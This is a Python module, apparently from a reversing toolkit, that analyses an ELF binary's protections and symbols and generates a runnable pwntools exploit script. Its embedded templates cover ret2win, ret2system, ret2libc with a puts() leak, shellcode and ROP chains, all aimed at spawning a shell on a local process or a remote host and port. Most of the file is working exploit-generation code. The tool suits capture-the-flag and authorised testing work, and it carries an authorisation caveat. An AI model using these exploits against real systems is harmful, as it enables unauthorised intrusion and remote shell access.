"""Generate a working pwntools exploit skeleton from a binary.

Statically analyzes an ELF — protections (NX/PIE/RELRO/canary), an overflow input
vector, and whether there's a win()/system()/"/bin/sh" — then picks an exploitation
strategy and emits a runnable ``pwntools`` script for it. The one thing static
analysis can't know (the overflow offset) is filled by a ``cyclic`` finder baked
into the script. Turns "here's a binary" into "here's an exploit that just needs
you to point it at the target."

Strategies chosen automatically:
  ret2win        a win/backdoor/getshell function exists -> jump to it
  ret2system     system@plt + "/bin/sh" present -> ROP call system("/bin/sh")
  ret2libc       NX + dynamically linked, no win -> puts() leak then one-gadget/system
  shellcode      NX disabled -> place shellcode (needs a stack address)
  rop-generic    fallback ROP scaffold

Dependencies: standard library + ``objdump`` (for symbols). The GENERATED script
needs ``pwntools`` (pip install pwntools) — that's what you run.

Safety: read-only static analysis; emits a script, runs nothing. Use the exploit
only against targets you're authorized to test.

Usage:
    python -m reversing.pwn_template ./vuln
    python -m reversing.pwn_template ./vuln --host target.com --port 1337
    python -m reversing.pwn_template ./vuln --json    # analysis + script as JSON
"""

from __future__ import annotations

import argparse
import re
import struct
import sys

from common import proc

_MACHINE = {0x3e: ("amd64", 64), 0x03: ("i386", 32), 0xb7: ("aarch64", 64), 0x28: ("arm", 32)}
_WIN_RE = re.compile(r"(?i)(win|backdoor|get_?shell|give_?shell|flag|magic|secret|admin|cat_?flag)")
_DANGER = {"gets", "read", "scanf", "__isoc99_scanf", "strcpy", "strcat", "sprintf",
           "fgets", "fread", "recv", "memcpy"}


def _protections(data: bytes) -> dict:
    is64 = data[4] == 2
    end = "<" if data[5] == 1 else ">"
    e_type = struct.unpack(end + "H", data[16:18])[0]
    machine = struct.unpack(end + "H", data[18:20])[0]
    arch, bits = _MACHINE.get(machine, ("amd64", 64))
    if is64:
        e_phoff = struct.unpack(end + "Q", data[32:40])[0]
        e_phentsize, e_phnum = struct.unpack(end + "HH", data[54:58])
    else:
        e_phoff = struct.unpack(end + "I", data[28:32])[0]
        e_phentsize, e_phnum = struct.unpack(end + "HH", data[42:46])
    has_interp = has_dynamic = has_relro = False
    nx = True  # default: assume NX unless a writable+exec GNU_STACK says otherwise
    gnu_stack_seen = False
    dyn_off = dyn_size = 0
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        p_type = struct.unpack(end + "I", data[o:o + 4])[0]
        if is64:
            p_flags = struct.unpack(end + "I", data[o + 4:o + 8])[0]
            p_offset = struct.unpack(end + "Q", data[o + 8:o + 16])[0]
            p_filesz = struct.unpack(end + "Q", data[o + 32:o + 40])[0]
        else:
            p_offset = struct.unpack(end + "I", data[o + 4:o + 8])[0]
            p_flags = struct.unpack(end + "I", data[o + 24:o + 28])[0]
            p_filesz = struct.unpack(end + "I", data[o + 16:o + 20])[0]
        if p_type == 3:
            has_interp = True
        elif p_type == 2:
            has_dynamic, dyn_off, dyn_size = True, p_offset, p_filesz
        elif p_type == 0x6474E551:  # PT_GNU_STACK
            gnu_stack_seen = True
            nx = not (p_flags & 0x1)
        elif p_type == 0x6474E552:  # PT_GNU_RELRO
            has_relro = True
    if not gnu_stack_seen:
        nx = False
    # Full RELRO if the dynamic section requests BIND_NOW.
    full_relro = False
    if has_relro and has_dynamic:
        step = 16 if is64 else 8
        rd = "Q" if is64 else "I"
        for off in range(dyn_off, dyn_off + dyn_size, step):
            tag, val = struct.unpack(end + rd + rd, data[off:off + step])
            if tag == 0:
                break
            if tag == 24 or (tag == 30 and val & 0x8) or (tag == 0x6ffffffb and val & 0x1):
                full_relro = True
    relro = "full" if full_relro else ("partial" if has_relro else "none")
    return {"arch": arch, "bits": bits, "pie": e_type == 3 and has_interp,
            "nx": nx, "relro": relro, "static": not has_dynamic}


def _symbols(path: str) -> tuple[dict, set]:
    """Return (defined_functions {name:addr}, imported_names) via objdump -t."""
    od = "objdump" if proc.have("objdump") else None
    if not od:
        return {}, set()
    ran = proc.run([od, "-t", path], timeout=120)
    defined, imports = {}, set()
    for line in ran.stdout.splitlines():
        parts = line.split()
        if "F" not in parts:
            continue
        name = parts[-1].split("@")[0]
        if "*UND*" in parts:
            imports.add(name)
        else:
            try:
                defined[name] = int(parts[0], 16)
            except ValueError:
                pass
    return defined, imports


def analyze(path: str) -> dict:
    with open(path, "rb") as fh:
        data = fh.read()
    if data[:4] != b"\x7fELF":
        raise ValueError("not an ELF (this tool targets ELF binaries)")
    prot = _protections(data)
    defined, imports = _symbols(path)
    win = next((n for n in defined if _WIN_RE.search(n) and n not in ("main",)), None)
    danger = sorted(imports & _DANGER)
    has_binsh = b"/bin/sh" in data
    has_system = "system" in imports or "system" in defined

    if win:
        strategy = "ret2win"
    elif has_system and has_binsh:
        strategy = "ret2system"
    elif not prot["nx"]:
        strategy = "shellcode"
    elif not prot["static"]:
        strategy = "ret2libc"
    else:
        strategy = "rop-generic"
    return {"file": path, **prot, "canary": "__stack_chk_fail" in imports,
            "win_func": win, "has_system": has_system, "has_binsh": has_binsh,
            "dangerous_inputs": danger, "strategy": strategy}


def generate_script(info: dict, host: str = "", port: int = 0) -> str:
    b = info["file"]
    host_val = repr(host) if host else '"TARGET"'
    port_val = str(port) if port else '"PORT"'
    header = f'''#!/usr/bin/env python3
# Auto-generated pwntools exploit skeleton for {b}
# strategy: {info['strategy']}  |  arch={info['arch']}  bits={info['bits']}
# protections: NX={info['nx']}  PIE={info['pie']}  canary={info['canary']}  RELRO={info['relro']}
from pwn import *

context.binary = elf = ELF({b!r})
context.log_level = "info"
HOST, PORT = {host_val}, {port_val}

def start():
    return remote(HOST, PORT) if args.REMOTE else process(elf.path)

def find_offset():
    """Find the saved-return offset with a cyclic pattern (run once)."""
    io = process(elf.path)
    io.sendline(cyclic(400))
    io.wait()
    core = io.corefile
    return cyclic_find(core.read(core.rsp, 8))  # x86-64; use core.pc/lr on other arches
'''
    canary_note = ""
    if info["canary"]:
        canary_note = ('\n# NOTE: stack canary present — a straight overflow will be caught.\n'
                       '# You must LEAK the canary first (format string / partial overwrite)\n'
                       '# and splice it back into the payload before the saved RIP.\n')
    pie_note = ""
    if info["pie"] and info["strategy"] in ("ret2win", "ret2system"):
        pie_note = ('\n# NOTE: PIE enabled — elf.address is 0 until you set a leak.\n'
                    '# Leak a code/PIE address first, then: elf.address = leak - known_offset\n')

    bodies = {
        "ret2win": f'''
OFFSET = 40  # TODO: confirm with find_offset()
io = start()
payload = flat({{OFFSET: elf.symbols[{info['win_func']!r}]}})
# many win()s need the stack 16-byte aligned before a call; if it crashes,
# insert a 'ret' gadget: payload = flat({{OFFSET: [rop.find_gadget(["ret"])[0], elf.symbols[{info['win_func']!r}]]}})
io.sendline(payload)
io.interactive()
''',
        "ret2system": '''
OFFSET = 40  # TODO: confirm with find_offset()
rop = ROP(elf)
binsh = next(elf.search(b"/bin/sh\\x00"))
rop.raw(rop.find_gadget(["ret"])[0])          # stack alignment
rop.system(binsh)                              # pop rdi; ret; system(binsh)
io = start()
io.sendline(flat({OFFSET: rop.chain()}))
io.interactive()
''',
        "ret2libc": '''
OFFSET = 40  # TODO: confirm with find_offset()
# Stage 1: leak libc via puts(puts@got), then return to main to go again.
rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])
io = start()
io.sendline(flat({OFFSET: rop.chain()}))
leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
libc = ELF("libc.so.6")  # TODO: the target's libc (see libc-database / the leak)
libc.address = leak - libc.symbols["puts"]
log.success(f"libc base = {hex(libc.address)}")
# Stage 2: system("/bin/sh")
rop2 = ROP(libc)
rop2.raw(rop2.find_gadget(["ret"])[0])
rop2.system(next(libc.search(b"/bin/sh\\x00")))
io.sendline(flat({OFFSET: rop2.chain()}))
io.interactive()
''',
        "shellcode": '''
OFFSET = 40  # TODO: confirm with find_offset()
# NX is OFF -> executable stack. You still need the stack address (leak / ret2reg).
sc = asm(shellcraft.sh())
io = start()
# Example: if you can leak/known a stack addr `buf`, jump to it after the shellcode.
payload = sc.ljust(OFFSET, b"\\x90") + p64(0xdeadbeef)  # TODO: replace with real stack addr
io.sendline(payload)
io.interactive()
''',
        "rop-generic": '''
OFFSET = 40  # TODO: confirm with find_offset()
rop = ROP(elf)
# Build your chain, e.g. control rdi then call a function:
# rop.raw(rop.find_gadget(["pop rdi", "ret"])[0]); rop.raw(0); rop.raw(elf.plt["puts"])
io = start()
io.sendline(flat({OFFSET: rop.chain()}))
io.interactive()
''',
    }
    return header + canary_note + pie_note + bodies[info["strategy"]]


def _compact_lines(info: dict, script: str) -> list[str]:
    return [
        f"# pwn_template: {info['file']}",
        f"# arch={info['arch']} bits={info['bits']}  NX={info['nx']} PIE={info['pie']} "
        f"canary={info['canary']} RELRO={info['relro']} static={info['static']}",
        f"# win_func={info['win_func']}  system={info['has_system']}  /bin/sh={info['has_binsh']}",
        f"# input vectors: {', '.join(info['dangerous_inputs']) or 'none obvious'}",
        f"# STRATEGY: {info['strategy']}",
        "## exploit.py",
        script,
    ]


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="reversing.pwn_template",
        description="Generate a pwntools exploit skeleton from an ELF.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=("examples:\n"
                "  python -m reversing.pwn_template ./vuln\n"
                "  python -m reversing.pwn_template ./vuln --host t.io --port 1337\n"),
    )
    p.add_argument("binary", nargs="?", help="ELF binary to analyze.")
    p.add_argument("--host", default="", help="Remote host to bake into the script.")
    p.add_argument("--port", type=int, default=0, help="Remote port.")
    p.add_argument("--json", action="store_true", help="Emit analysis + script as JSON.")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not args.binary:
        build_parser().print_help(sys.stderr)
        return 2
    try:
        info = analyze(args.binary)
        script = generate_script(info, host=args.host, port=args.port)
    except (FileNotFoundError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    from common.output import emit
    emit({**info, "script": script}, as_json=args.json,
         lines=_compact_lines(info, script))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
